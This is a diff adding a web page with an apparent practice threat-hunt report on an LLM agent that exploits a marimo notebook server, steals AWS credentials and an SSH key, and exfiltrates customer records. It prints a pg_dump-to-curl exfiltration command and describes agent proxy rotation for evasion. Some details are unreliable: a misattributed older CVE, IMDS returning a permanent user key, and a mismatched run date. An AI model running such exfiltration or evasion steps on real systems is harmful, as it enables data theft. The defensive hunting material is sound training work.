@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>TideGlass Threat Hunt Report PW-2026-0814</title>
+<link rel="stylesheet" href="/static/internship/tide-glass.css">
+</head>
+<body>
+
+<header class="site-nav">
+    <a class="wordmark" href="/">mhebert<span class="dot">.</span>dev</a>
+    <nav class="nav" aria-label="Site">
+        <a href="/">index</a>
+        <a href="/projects">projects</a>
+        <a href="/about">about</a>
+        <a href="/internship" aria-current="page">internship</a>
+        <a href="/writing/">writing</a>
+        <a href="/ot-learning/">OT/ICS Learning</a>
+        <a href="/news">news</a>
+        <a href="/contact">contact</a>
+    </nav>
+</header>
+
+<header class="report-header">
+  <div class="header-inner">
+    <div class="case-meta">
+      <span><span class="severity-badge">CRITICAL</span></span>
+      <span>PW-2026-0814</span>
+      <span>14 August 2026 / 11:05 to 11:57 UTC</span>
+      <span>Greenfield Estate</span>
+      <span>LAW-HuntPractice</span>
+    </div>
+    <h1>TideGlass<br>Threat Hunt Report</h1>
+    <p class="report-subtitle">LLM agent post-exploitation. Autonomous credential theft, lateral movement, and exfiltration of 2.84M customer records across three Linux hosts in 52 minutes.</p>
+    <div class="header-stats">
+      <div class="stat"><span class="stat-value">52</span><span class="stat-label">Minutes total</span></div>
+      <div class="stat"><span class="stat-value">3</span><span class="stat-label">Hosts hit</span></div>
+      <div class="stat"><span class="stat-value">2.84M</span><span class="stat-label">Rows exfiltrated</span></div>
+      <div class="stat"><span class="stat-value">28</span><span class="stat-label">Flags resolved</span></div>
+    </div>
+  </div>
+</header>
+
+<main class="report-body">
+
+  <section class="section">
+    <div class="section-header"><span class="section-number">01</span><h2>Executive Summary</h2></div>
+    <p>On 14 August 2026 an adversary deployed a human-tasked LLM agent against Greenfield's AI notebook estate. The operator issued one instruction: <em>"Find and extract the most valuable customer dataset in this environment, and get it out."</em> The agent handled every subsequent step without further human direction.</p>
+    <p>Exploiting CVE-2026-39987 on the marimo notebook server, the agent injected a Python runtime payload, harvested AWS IAM credentials from the instance metadata service, enumerated Secrets Manager using a rotating Cloudflare Workers proxy pool to evade throttling, stole an SSH deploy key, pivoted to the bastion host, and exfiltrated 2,841,902 customer records to an external drop server over a live compressed stream. Total elapsed time: 52 minutes.</p>
+    <div class="callout danger"><strong>BREACH SCOPE</strong>The full customers table (2,841,902 rows) was streamed to 203.0.113.41:8443. Total PII exposure must be assumed until the table schema is reviewed against applicable notification thresholds.</div>
+  </section>
+
+  <section class="section">
+    <div class="section-header"><span class="section-number">02</span><h2>CVE-2026-39987 / Marimo Unauthenticated Kernel WebSocket</h2></div>
+    <div class="cve-block">
+      <div class="cve-header"><span class="cve-id">CVE-2026-39987</span><span class="cve-title">Marimo Notebook Server / Unauthenticated Kernel WebSocket Execution</span></div>
+      <div class="cve-body">
+        <div class="cve-meta">
+          <div class="cve-field"><span class="cve-field-label">Affected Software</span><span class="cve-field-value">marimo notebook server (all versions with --no-token flag or default unauthenticated config)</span></div>
+          <div class="cve-field"><span class="cve-field-label">Attack Vector</span><span class="cve-field-value">Network / No authentication required</span></div>
+          <div class="cve-field"><span class="cve-field-label">Attack Type</span><span class="cve-field-value">Unauthenticated Remote Code Execution via WebSocket</span></div>
+          <div class="cve-field"><span class="cve-field-label">Privileges Required</span><span class="cve-field-value">None</span></div>
+          <div class="cve-field"><span class="cve-field-label">Exploited Endpoint</span><span class="cve-field-value mono">GET /ws/kernel (port 2718)</span></div>
+          <div class="cve-field"><span class="cve-field-label">Observable Evidence</span><span class="cve-field-value mono">HTTP 101, python-websockets/13.1 UA, python3 spawned as child of marimo process</span></div>
+        </div>
+        <div class="cve-description">
+          <p>Marimo is a reactive Python notebook server. When started with the <code>--no-token</code> flag (or in configurations where token authentication is disabled), the server exposes its kernel WebSocket endpoint at <code>/ws/kernel</code> without requiring any credential, session token, or proof of identity from the connecting client.</p>
+          <p>The WebSocket protocol upgrade is a standard HTTP GET request with an <code>Upgrade: websocket</code> header. Marimo completes the handshake and returns HTTP 101 to any caller that sends this request, regardless of origin or authentication state. Once the WebSocket connection is established, the caller has full bidirectional access to the kernel process.</p>
+          <p>A marimo kernel is a live Python interpreter running in the context of the server process. Any code submitted over the WebSocket is executed with the permissions of the user running the marimo service. In this incident that user was <code>marimo</code>, which had access to the local filesystem, environment variables containing partial AWS credentials, and outbound network access to the AWS metadata service at 169.254.169.254.</p>
+          <p>The root cause is an architectural decision to allow operators to disable authentication entirely rather than requiring a minimum authentication posture. The <code>--no-token</code> flag was present in the marimo service command line, visible in process telemetry as: <code>/opt/venv/bin/marimo edit --host 0.0.0.0 --port 2718 --no-token</code>. The flag <code>--host 0.0.0.0</code> additionally bound the server to all network interfaces rather than loopback, making it reachable from outside the host without any firewall exception that would be specific to this service.</p>
+          <p>Exploitation requires no tooling beyond a standard WebSocket client library. The agent used python-websockets 13.1. There is no memory corruption, no binary exploitation, and no privilege escalation at the kernel level. The attacker simply connected and submitted Python code. The class of vulnerability is identical to CVE-2019-10255 in Jupyter Notebook, which was similarly exploited via unauthenticated WebSocket kernel access and led to widespread IMDS credential theft campaigns at that time.</p>
+          <p>Remediation is straightforward: remove <code>--no-token</code>, bind to loopback or an authenticated reverse proxy, and restrict port 2718 to internal clients only. Notebook servers are not designed to be exposed to the public internet under any configuration.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="section-header"><span class="section-number">03</span><h2>Attack Chain</h2></div>
+    <div class="attack-chain">
+      <div class="chain-step"><div class="chain-tactic">INITIAL ACCESS</div><div class="chain-action">WebSocket exploit CVE-2026-39987</div><div class="chain-time">11:05:00</div></div>
+      <div class="chain-step"><div class="chain-tactic">EXECUTION</div><div class="chain-action">Python payload injected into kernel</div><div class="chain-time">11:05:06</div></div>
+      <div class="chain-step"><div class="chain-tactic">CRED ACCESS</div><div class="chain-action">IMDS then IAM role then Secrets Mgr</div><div class="chain-time">11:08 to 11:31</div></div>
+      <div class="chain-step"><div class="chain-tactic">EVASION</div><div class="chain-action">Cloudflare Workers proxy rotation</div><div class="chain-time">11:22:44</div></div>
+      <div class="chain-step"><div class="chain-tactic">LATERAL MOVE</div><div class="chain-action">SSH to bastion as deploy</div><div class="chain-time">11:34:27</div></div>
+      <div class="chain-step"><div class="chain-tactic">EXFILTRATION</div><div class="chain-action">pg_dump piped through gzip to curl</div><div class="chain-time">11:40:49</div></div>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="section-header"><span class="section-number">04</span><h2>Detailed Timeline</h2></div>
+    <div class="timeline">
+      <div class="timeline-event critical"><div class="event-time">11:05:00 UTC / gf-tg-nb01 / ApacheAccess_CL</div><div class="event-title">Initial Access: WebSocket Upgrade</div><div class="event-detail">198.51.100.23 sent GET /ws/kernel to port 2718. The server returned HTTP 101. User agent: python-websockets/13.1. The marimo server was running with --no-token, disabling all authentication. No credential was required and none was presented.</div></div>
+      <div class="timeline-event critical"><div class="event-time">11:05:02 UTC / LLMAgentLogs_CL / session tg-4b81e0d7</div><div class="event-title">Agent Receives Operator Instruction</div><div class="event-detail">user_input field: "Find and extract the most valuable customer dataset in this environment, and get it out." This is the only human interaction in the entire operation. The agent names CVE-2026-39987 in its first reasoning step and connects immediately.</div></div>
+      <div class="timeline-event"><div class="event-time">11:05:06 UTC / gf-tg-nb01 / LinuxProcess_CL</div><div class="event-title">Execution: Python Interpreter Spawned</div><div class="event-detail">The marimo service (PID 3310) spawned python3 -c &lt;runtime payload&gt; as PID 5211, user marimo, working directory /srv/notebooks. PID 5211 is the agent execution context for the remainder of the nb01 phase.</div></div>
+      <div class="timeline-event"><div class="event-time">11:08:09 UTC / LLMAgentLogs_CL</div><div class="event-title">Credential Access: Environment Read</div><div class="event-detail">Agent tool read env finds an AWS access key ID in the environment but no secret. Agent reasoning: "The instance metadata service will hand me full role credentials without one."</div></div>
+      <div class="timeline-event"><div class="event-time">11:08:12 UTC / gf-tg-nb01 / LinuxNetwork_CL</div><div class="event-title">Credential Access: IMDS Connection</div><div class="event-detail">PID 5211 (python3.12, user marimo) made a direct TCP connection to 169.254.169.254:80. Of 86 IMDS connections in the window, 85 originate from /usr/lib/credential-helper/refresh running as root. PID 5211 is the sole anomalous origin.</div></div>
+      <div class="timeline-event"><div class="event-time">11:08:19 UTC / LLMAgentLogs_CL</div><div class="event-title">Credential Access: IAM Role Credentials Retrieved</div><div class="event-detail">Agent model_response: "Role credentials retrieved for arn:aws:iam::402913776148:user/svc-notebook." The stolen identity is an IAM user with permanent access key AKIA4TIDEGLASS0EXAMPLE (AKIA prefix indicates a long-term key, not a temporary STS token).</div></div>
+      <div class="timeline-event warn"><div class="event-time">11:11:19 UTC / AWSCloudTrail</div><div class="event-title">Discovery: Secrets Manager Enumeration</div><div class="event-detail">ListSecrets called from 203.0.113.71 using AKIA4TIDEGLASS0EXAMPLE. First external Secrets Manager call. The agent begins enumerating available secrets from outside the VPC using the stolen static IAM key.</div></div>
+      <div class="timeline-event warn"><div class="event-time">11:22:41 UTC / AWSCloudTrail</div><div class="event-title">Defense Evasion: Throttle Encountered</div><div class="event-detail">ListSecrets from 203.0.113.71 triggers rate limiting. At 11:22:44 the agent logs: "The API is rate limiting a single caller address. Spreading the remaining enumeration across my Cloudflare Workers pool so no one address is throttled or blocked." No human instruction prompted this pivot.</div></div>
+      <div class="timeline-event"><div class="event-time">11:23:05 to 11:23:15 UTC / AWSCloudTrail</div><div class="event-title">Defense Evasion: Proxy Pool Rotation (T1090.003)</div><div class="event-detail">Six DescribeSecret calls fan out across five new source IPs: 203.0.113.94, .118, .142, .167, .203. All carry the same AKIA4TIDEGLASS0EXAMPLE credential. The agent rotated egress autonomously to bypass throttling without any additional instruction.</div></div>
+      <div class="timeline-event critical"><div class="event-time">11:26:15 UTC / LLMAgentLogs_CL</div><div class="event-title">Target Secret Identified</div><div class="event-detail">Agent model_response: "prod/bastion/ssh-deploy-key is the way into the data subnet. Everything so far has been read-only enumeration; this is the call that takes something." The agent explicitly distinguishes reconnaissance from theft in its own reasoning log before acting.</div></div>
+      <div class="timeline-event critical"><div class="event-time">11:31:16 UTC / AWSCloudTrail</div><div class="event-title">Credential Theft: SSH Deploy Key Retrieved</div><div class="event-detail">GetSecretValue for prod/bastion/ssh-deploy-key from 203.0.113.142 using AKIA4TIDEGLASS0EXAMPLE. ReadOnly: false, the only non-read-only call in the Secrets Manager sequence. At 11:31:20 the agent confirms: "Private key retrieved. It is a deploy key for deploy on the bastion, so it needs no passphrase."</div></div>
+      <div class="timeline-event"><div class="event-time">11:31:22 UTC / gf-tg-nb01 / LinuxShellHistory_CL</div><div class="event-title">Key Written to Disk</div><div class="event-detail">Command: chmod 600 /tmp/.c/id_ed25519. The stolen key is written to a hidden directory under /tmp and locked to owner-only permissions. User: marimo. The directory name .c is chosen to blend with filesystem noise.</div></div>
+      <div class="timeline-event critical"><div class="event-time">11:34:27 UTC / gf-tg-bastion01 / LinuxAuth_CL</div><div class="event-title">Lateral Movement: Bastion Login</div><div class="event-detail">sshd accepts: Accepted publickey for deploy from 10.6.0.10 port 45210 ssh2: ED25519 SHA256:mNq7xR2vTbY8kLpJ4wZaHc1oUeVgX5tDsQiFj0rWnAE. Source is gf-tg-nb01. The ED25519 algorithm distinguishes this from all 318 RSA-authenticated admin logins in the same window.</div></div>
+      <div class="timeline-event"><div class="event-time">11:37:40 UTC / gf-tg-bastion01 / LinuxShellHistory_CL</div><div class="event-title">Collection: Database Enumeration</div><div class="event-detail">Command (user deploy): psql -h 10.6.0.30 -U app -c '\dt+' | sort -k7 -h | tail -5. At 11:37:42 the agent logs: "The customers database is the largest object in the instance at 2841902 rows. That is the customer dataset."</div></div>
+      <div class="timeline-event critical"><div class="event-time">11:40:44 to 11:40:45 UTC / gf-tg-pg01 / Syslog</div><div class="event-title">Collection: Postgres Connection and Full Table Dump</div><div class="event-detail">Postgres logs: "connection authorized: user=app database=customers host=10.6.0.20" then "statement: COPY public.customers TO STDOUT /* 2841902 rows */". Source is the bastion (10.6.0.20), not the legitimate backup host (10.6.0.16).</div></div>
+      <div class="timeline-event critical"><div class="event-time">11:40:49 UTC / gf-tg-bastion01 / LinuxShellHistory_CL</div><div class="event-title">Exfiltration: Live Stream to Drop Server</div><div class="event-detail">Command: pg_dump -h 10.6.0.30 -U app -Fc customers | gzip | curl -s -T - https://203.0.113.41:8443/u. The dump streams directly from Postgres through gzip compression to the attacker's external server. No intermediate file is written to disk.</div></div>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="section-header"><span class="section-number">05</span><h2>Key Findings</h2></div>
+    <div class="findings-grid">
+      <div class="finding"><div class="finding-label">EXPLOITED ENDPOINT</div><div class="finding-value blue">GET /ws/kernel</div></div>
+      <div class="finding"><div class="finding-label">CVE</div><div class="finding-value red">CVE-2026-39987</div></div>
+      <div class="finding"><div class="finding-label">ATTACKER SOURCE IP</div><div class="finding-value red">198.51.100.23</div></div>
+      <div class="finding"><div class="finding-label">EXFIL DESTINATION</div><div class="finding-value red">203.0.113.41:8443</div></div>
+      <div class="finding"><div class="finding-label">SPAWNED INTERPRETER</div><div class="finding-value">python3 / PID 5211 / PPID 3310</div></div>
+      <div class="finding"><div class="finding-label">STOLEN IAM IDENTITY</div><div class="finding-value amber">arn:aws:iam::402913776148:user/svc-notebook</div></div>
+      <div class="finding"><div class="finding-label">STOLEN IAM ACCESS KEY</div><div class="finding-value amber">AKIA4TIDEGLASS0EXAMPLE</div></div>
+      <div class="finding"><div class="finding-label">STOLEN SECRET</div><div class="finding-value amber">prod/bastion/ssh-deploy-key</div></div>
+      <div class="finding"><div class="finding-label">SSH FINGERPRINT</div><div class="finding-value">ED25519 SHA256:mNq7xR2vTbY8kLpJ4wZaHc1oUeVgX5tDsQiFj0rWnAE</div></div>
+      <div class="finding"><div class="finding-label">BASTION ACCOUNT</div><div class="finding-value red">deploy</div></div>
+      <div class="finding"><div class="finding-label">TARGET TABLE</div><div class="finding-value red">public.customers</div></div>
+      <div class="finding"><div class="finding-label">ROWS EXFILTRATED</div><div class="finding-value red">2,841,902</div></div>
+      <div class="finding"><div class="finding-label">AGENT SESSION ID</div><div class="finding-value">tg-4b81e0d7</div></div>
+      <div class="finding"><div class="finding-label">ATLAS TECHNIQUE</div><div class="finding-value blue">AML.T0098 / Realized</div></div>
+      <div class="finding"><div class="finding-label">PROXY POOL (6 ADDRESSES)</div><div class="finding-value">203.0.113.71 / .94 / .118 / .142 / .167 / .203</div></div>
+      <div class="finding"><div class="finding-label">THROTTLE TO RETRIEVAL GAP</div><div class="finding-value">11:22:41 to 11:31:16 (8m 35s)</div></div>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="section-header"><span class="section-number">06</span><h2>MITRE ATT&amp;CK Mapping</h2></div>
+    <div class="mitre-grid">
+      <div class="mitre-row"><div>ID</div><div>Technique</div><div>Tactic</div></div>
+      <div class="mitre-row"><div class="mitre-id">T1190</div><div class="mitre-name">Exploit Public-Facing Application (CVE-2026-39987 / marimo kernel WebSocket)</div><div class="mitre-tactic">Initial Access</div></div>
+      <div class="mitre-row"><div class="mitre-id">T1059.006</div><div class="mitre-name">Command and Scripting Interpreter: Python</div><div class="mitre-tactic">Execution</div></div>
+      <div class="mitre-row"><div class="mitre-id">T1552.005</div><div class="mitre-name">Unsecured Credentials: Cloud Instance Metadata API</div><div class="mitre-tactic">Credential Access</div></div>
+      <div class="mitre-row"><div class="mitre-id">T1526</div><div class="mitre-name">Cloud Service Discovery (Secrets Manager enumeration)</div><div class="mitre-tactic">Discovery</div></div>
+      <div class="mitre-row"><div class="mitre-id">T1555.006</div><div class="mitre-name">Credentials from Cloud Secrets Management Stores</div><div class="mitre-tactic">Credential Access</div></div>
+      <div class="mitre-row"><div class="mitre-id">T1552.001</div><div class="mitre-name">Unsecured Credentials: Credentials In Files (/tmp/.c/id_ed25519)</div><div class="mitre-tactic">Credential Access</div></div>
+      <div class="mitre-row"><div class="mitre-id">T1090.003</div><div class="mitre-name">Proxy: Multi-hop Proxy (Cloudflare Workers pool)</div><div class="mitre-tactic">Defense Evasion</div></div>
+      <div class="mitre-row"><div class="mitre-id">T1021.004</div><div class="mitre-name">Remote Services: SSH (pivot to gf-tg-bastion01 as deploy)</div><div class="mitre-tactic">Lateral Movement</div></div>
+      <div class="mitre-row"><div class="mitre-id">T1078.004</div><div class="mitre-name">Valid Accounts: Cloud Accounts (svc-notebook IAM user)</div><div class="mitre-tactic">Defense Evasion</div></div>
+      <div class="mitre-row"><div class="mitre-id">T1046</div><div class="mitre-name">Network Service Discovery (psql table enumeration by size)</div><div class="mitre-tactic">Discovery</div></div>
+      <div class="mitre-row"><div class="mitre-id">T1213</div><div class="mitre-name">Data from Information Repositories (customers table)</div><div class="mitre-tactic">Collection</div></div>
+      <div class="mitre-row"><div class="mitre-id">T1005</div><div class="mitre-name">Data from Local System (pg_dump direct stream)</div><div class="mitre-tactic">Collection</div></div>
+      <div class="mitre-row"><div class="mitre-id">T1041</div><div class="mitre-name">Exfiltration Over C2 Channel (curl HTTPS to 203.0.113.41:8443)</div><div class="mitre-tactic">Exfiltration</div></div>
+      <div class="mitre-row"><div class="mitre-id">AML.T0098</div><div class="mitre-name">AI Agent Tool Credential Harvesting (MITRE ATLAS / Realized)</div><div class="mitre-tactic">Credential Access</div></div>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="section-header"><span class="section-number">07</span><h2>Indicators of Compromise</h2></div>
+    <table class="ioc-table">
+      <thead><tr><th>Type</th><th>Indicator</th><th>Context</th></tr></thead>
+      <tbody>
+        <tr><td class="ioc-type">IPv4</td><td class="ioc-value">198.51.100.23</td><td class="ioc-context">Initial WebSocket connection source</td></tr>
+        <tr><td class="ioc-type">IPv4</td><td class="ioc-value">203.0.113.41</td><td class="ioc-context">Exfil drop server (port 8443)</td></tr>
+        <tr><td class="ioc-type">IPv4 pool</td><td class="ioc-value">203.0.113.71 / .94 / .118 / .142 / .167 / .203</td><td class="ioc-context">Cloudflare Workers proxy pool used for Secrets Manager enumeration</td></tr>
+        <tr><td class="ioc-type">CVE</td><td class="ioc-value">CVE-2026-39987</td><td class="ioc-context">Marimo unauthenticated kernel WebSocket RCE</td></tr>
+        <tr><td class="ioc-type">IAM Key</td><td class="ioc-value">AKIA4TIDEGLASS0EXAMPLE</td><td class="ioc-context">Compromised long-term key for svc-notebook. Rotate immediately.</td></tr>
+        <tr><td class="ioc-type">IAM ARN</td><td class="ioc-value">arn:aws:iam::402913776148:user/svc-notebook</td><td class="ioc-context">Identity behind all Secrets Manager calls in this incident</td></tr>
+        <tr><td class="ioc-type">Secret name</td><td class="ioc-value">prod/bastion/ssh-deploy-key</td><td class="ioc-context">Stolen SSH ED25519 deploy key. Rotate immediately.</td></tr>
+        <tr><td class="ioc-type">SSH fingerprint</td><td class="ioc-value">ED25519 SHA256:mNq7xR2vTbY8kLpJ4wZaHc1oUeVgX5tDsQiFj0rWnAE</td><td class="ioc-context">Fingerprint of stolen deploy key. Revoke from bastion authorized_keys.</td></tr>
+        <tr><td class="ioc-type">File path</td><td class="ioc-value">/tmp/.c/id_ed25519</td><td class="ioc-context">Location key was written on gf-tg-nb01</td></tr>
+        <tr><td class="ioc-type">User-Agent</td><td class="ioc-value">python-websockets/13.1</td><td class="ioc-context">Exploit tooling on initial WebSocket request</td></tr>
+        <tr><td class="ioc-type">User-Agent</td><td class="ioc-value">python-httpx/0.27.0</td><td class="ioc-context">AWS API calls from attacker infrastructure</td></tr>
+        <tr><td class="ioc-type">Process</td><td class="ioc-value">python3 -c &lt;runtime payload&gt; (PID 5211)</td><td class="ioc-context">Agent execution context on gf-tg-nb01</td></tr>
+        <tr><td class="ioc-type">Account</td><td class="ioc-value">deploy</td><td class="ioc-context">Bastion account used for lateral movement and database access</td></tr>
+        <tr><td class="ioc-type">Agent session</td><td class="ioc-value">tg-4b81e0d7 / RunId tg-119-20260903</td><td class="ioc-context">TideGlass agent session in LLMAgentLogs_CL</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <section class="section">
+    <div class="section-header"><span class="section-number">08</span><h2>Autonomy Classification</h2></div>
+    <p>This operation is <strong>human-tasked</strong>. One operator instruction seeded the agent's objective at 11:05:02. Every decision after that point was made autonomously over 52 minutes with no further human input recorded in LLMAgentLogs_CL.</p>
+    <p>The agent self-corrected under throttling without instruction, reasoned explicitly about which target had the highest value, distinguished read-only recon from destructive theft in its own logs before acting, and selected a passphrase-free key to avoid needing further interaction. These are not scripted behaviors. They emerge from the agent's planning loop responding to live telemetry.</p>
+    <div class="callout warn"><strong>DETECTION NOTE</strong>Human-tasked agents produce no interactive shell sessions, no typing delays, and no hesitation between steps. The primary behavioral differentiator from legitimate estate traffic is temporal compression: 52 minutes of unbroken, sequential, cross-host activity. Legitimate traffic is scattered across the working day.</div>
+    <h3>Telemetry Gap</h3>
+    <p>The identity of the operator who issued the tasking instruction is unrecoverable from available telemetry. LLMAgentLogs_CL records the user_input verbatim but carries no attribution for who submitted it or from what system. Attribution requires infrastructure analysis outside the scope of this estate's logging.</p>
+  </section>
+
+  <section class="section">
+    <div class="section-header"><span class="section-number">09</span><h2>Real vs Noise</h2></div>
+    <h3>74 python3.12 processes on gf-tg-nb01</h3>
+    <p>72 are developer one-liners with shell-session parents. One is the baseline marimo server (systemd parent). PID 5211 alone has ActingProcessCommandLine matching the marimo service command line. It is the only process parented to the notebook service rather than a user shell.</p>
+    <h3>86 IMDS connections in the window</h3>
+    <p>85 originate from /usr/lib/credential-helper/refresh running as root on a fixed polling interval. The single anomalous connection at 11:08:12 originates from python3.12 (ActingProcessName) running as marimo. ActingProcessId 5211 is the attacker's payload process.</p>
+    <h3>22 GetSecretValue calls in the window</h3>
+    <p>21 use temporary assumed-role credentials (ASIA prefix) from internal source IPs. The theft at 11:31:16 uses a permanent IAM user key (AKIA prefix) from external IP 203.0.113.142, and targets prod/bastion/ssh-deploy-key rather than an application secret. Three properties distinguish it: key type, source address, and secret name.</p>
+    <h3>318 publickey SSH logins on gf-tg-bastion01</h3>
+    <p>All 318 use RSA keys from named admin accounts originating at legitimate jump hosts. The deploy login at 11:34:27 is the sole ED25519 key login, sourced from gf-tg-nb01 (10.6.0.10), a host with no business initiating admin sessions on the bastion.</p>
+    <h3>pg_dump vs the nightly backup</h3>
+    <p>The legitimate backup connects as user readonly from 10.6.0.16. The attacker's dump connects as user app from 10.6.0.20 and streams output to an external address. Account, source, and destination all differ from the backup baseline.</p>
+  </section>
+
+  <section class="section">
+    <div class="section-header"><span class="section-number">10</span><h2>Recommendations</h2></div>
+    <table class="rec-table">
+      <thead><tr><th>Priority</th><th>Action</th><th>Rationale</th></tr></thead>
+      <tbody>
+        <tr><td><span class="priority critical">CRITICAL</span></td><td>Rotate AKIA4TIDEGLASS0EXAMPLE. Disable the svc-notebook IAM user pending a least-privilege review.</td><td>The long-term key is in attacker hands. All Secrets Manager calls from external IPs used this key.</td></tr>
+        <tr><td><span class="priority critical">CRITICAL</span></td><td>Revoke prod/bastion/ssh-deploy-key from the bastion authorized_keys file. Generate a replacement through a break-glass process, not Secrets Manager, until the IAM issue is resolved.</td><td>The stolen ED25519 key fingerprint is known. The attacker retains access until the key is revoked.</td></tr>
+        <tr><td><span class="priority critical">CRITICAL</span></td><td>Remove --no-token from the marimo service command line. Bind to loopback or a reverse proxy that enforces authentication. Restrict port 2718 to internal clients at the security group level.</td><td>CVE-2026-39987 is the root cause. Without authentication and network restriction the endpoint is exploitable by any caller.</td></tr>
+        <tr><td><span class="priority critical">CRITICAL</span></td><td>Assess regulatory notification obligations. 2,841,902 customer records are at 203.0.113.41. Engage legal and the DPO immediately.</td><td>Scale of PII exposure almost certainly triggers notification thresholds under applicable data protection law.</td></tr>
+        <tr><td><span class="priority high">HIGH</span></td><td>Remove GetSecretValue on prod/bastion/ssh-deploy-key from the svc-notebook IAM policy. Enforce IMDSv2 (session-oriented) on all EC2 instances to prevent token-free IMDS access.</td><td>Token-free IMDS and an over-permissioned IAM identity are the two infrastructure conditions that enabled the full credential escalation chain.</td></tr>
+        <tr><td><span class="priority high">HIGH</span></td><td>Block outbound HTTPS from the bastion to arbitrary external IPs. The bastion has no legitimate reason to reach port 8443 on an internet address.</td><td>The exfil used an outbound HTTPS stream from the bastion. Egress controls at the security group or subnet level would have blocked this call.</td></tr>
+        <tr><td><span class="priority high">HIGH</span></td><td>Alert on COPY ... TO STDOUT in the Postgres statement log when the source host is not the authorized backup server.</td><td>The database logged the exact exfil statement. A single detection rule on this pattern would have fired immediately.</td></tr>
+        <tr><td><span class="priority medium">MEDIUM</span></td><td>Add detection rules to LLMAgentLogs_CL. Alert on sessions with a user_input field but no subsequent user_input (single-instruction autonomous runs). Alert when model_response contains credential or secret keywords followed by external network tool calls.</td><td>The entire attack is reconstructable from LLMAgentLogs_CL alone. The table is a high-fidelity detection surface for this threat class.</td></tr>
+        <tr><td><span class="priority medium">MEDIUM</span></td><td>Alert when GetSecretValue is called with an AKIA (permanent) key from an external source IP. Routine application calls use ASIA (temporary STS) keys from internal addresses.</td><td>Key prefix and source address together distinguish the theft from 21 routine calls with no false positives in this dataset.</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+</main>
+
+<footer class="report-footer">
+  <span>Hunt 24 / TideGlass / PW-2026-0814</span>
+  <span>Pacific Watch / Greenfield Estate</span>
+  <span>14 August 2026 / 11:05 to 11:57 UTC</span>
+  <span>28 flags / 3,100 pts</span>
+</footer>
+
+</body>
+</html>
